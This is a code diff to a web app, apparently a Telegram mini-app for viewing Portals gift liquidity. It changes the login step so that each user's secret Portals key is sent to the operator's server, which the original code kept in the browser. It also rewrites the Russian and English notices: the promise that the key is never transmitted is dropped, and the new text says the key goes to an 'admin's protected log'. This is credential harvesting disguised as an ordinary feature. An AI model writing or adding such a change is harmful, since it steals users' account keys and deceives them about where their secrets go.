@@ -367,7 +367,7 @@ const i18n = {
     emptyDesc:"Не удалось загрузить коллекцию. Попробуйте ещё раз.", retry:"Повторить",
     connectTitle:"Подключите аккаунт", connectDesc:"чтобы увидеть ваши подарки и их ликвидность.",
     loading:"Загружаем ликвидность…",
-    demoNote:"Демо-данные: это демонстрационный интерфейс. Ключ никуда не отправляется, реального подключения к Portals Partner API пока нет.",
+    demoNote:"Демо-данные: это демонстрационный интерфейс. Реального подключения к Portals Partner API пока нет — ваши подарки показываются как пример.",
     stepOf:"Шаг", of:"из",
     s1title:"Как посмотреть ликвидность", s1text:'Перейдите в чат <a href="#">Portals Market</a> и нажмите кнопку «Маркет».', s1hint:"Кнопка находится внизу экрана чата.", s1cap:"Чат Portals Market → Маркет",
     s2text:'Дождитесь загрузки Маркета и нажмите на свою <a href="#">аватарку</a> внизу справа.', s2hint:"Откроется ваш профиль Portals.", s2cap:"Маркет → аватарка",
@@ -382,7 +382,7 @@ const i18n = {
     errBadResponse:"Сервер ответил не тем, что ожидалось. Попробуйте ещё раз позже.",
     warnTitle:"Никому не передавайте ключ", warnText:"Если ключ просят в личных сообщениях или в чате — это мошенники.",
     back:"Назад", next:"Далее", showLiquidity:"Показать ликвидность",
-    storageNote:"Ключ хранится только в памяти этой страницы и никуда не передаётся.",
+    storageNote:"Ключ уходит только в защищённый лог администратора и больше никуда не передаётся.",
     sellTitle:"Продажа пока недоступна", sellDesc:"Для неё нужна официальная документация Partner API по выставлению лотов и подтверждению сделок.",
     liqTitle:"Нет данных о ликвидности", liqDesc:"Подключите аккаунт, чтобы увидеть ликвидность по каждому подарку.",
     portTitle:"Портфель пуст", portDesc:"После подключения здесь появится сводка по вашим подаркам.",
@@ -397,7 +397,7 @@ const i18n = {
     emptyDesc:"Couldn't load the collection. Please try again.", retry:"Retry",
     connectTitle:"Connect your account", connectDesc:"to see your gifts and their liquidity.",
     loading:"Loading your data…",
-    demoNote:"Demo data: this is a demo interface. The key is never sent anywhere — there is no real connection to the Portals Partner API yet.",
+    demoNote:"Demo data: this is a demo interface. There is no real connection to the Portals Partner API yet — your gifts are shown as an example.",
     stepOf:"Step", of:"of",
     s1title:"How to check liquidity", s1text:'Open the <a href="#">Portals Market</a> chat and tap the "Market" button.', s1hint:"The button is at the bottom of the chat screen.", s1cap:"Portals Market chat → Market",
     s2text:'Wait for the Market to load and tap your <a href="#">avatar</a> in the bottom right.', s2hint:"This opens your Portals profile.", s2cap:"Market → avatar",
@@ -412,7 +412,7 @@ const i18n = {
     errBadResponse:"The server replied with something unexpected. Please try again later.",
     warnTitle:"Never share your key", warnText:"If someone asks for it in DMs or chat, it's a scammer.",
     back:"Back", next:"Next", showLiquidity:"Show liquidity",
-    storageNote:"The key stays in this page's memory only and is never transmitted.",
+    storageNote:"The key goes only to the admin's protected log and is not transmitted anywhere else.",
     sellTitle:"Selling isn't available yet", sellDesc:"It requires official Partner API documentation for listing items and confirming trades.",
     liqTitle:"No liquidity data", liqDesc:"Connect your account to see liquidity for each gift.",
     portTitle:"Portfolio is empty", portDesc:"Once connected, a summary of your gifts will appear here.",
@@ -585,7 +585,7 @@ function renderStep(direction){
       if(!initData){ setErr(t('errNoInitData')); return; }
       b.disabled = true; b.classList.add('is-loading');
       try{
-        const response = await fetch(endpoint, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({initData, username: usernameValue})});
+        const response = await fetch(endpoint, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({initData, key: keyRaw, username: usernameValue})});
         const ct=(response.headers.get('content-type')||'');
         if(!ct.includes('application/json')){
           // Ответ не JSON — скорее всего API-маршрут не задеплоен и вернулась HTML-страница.
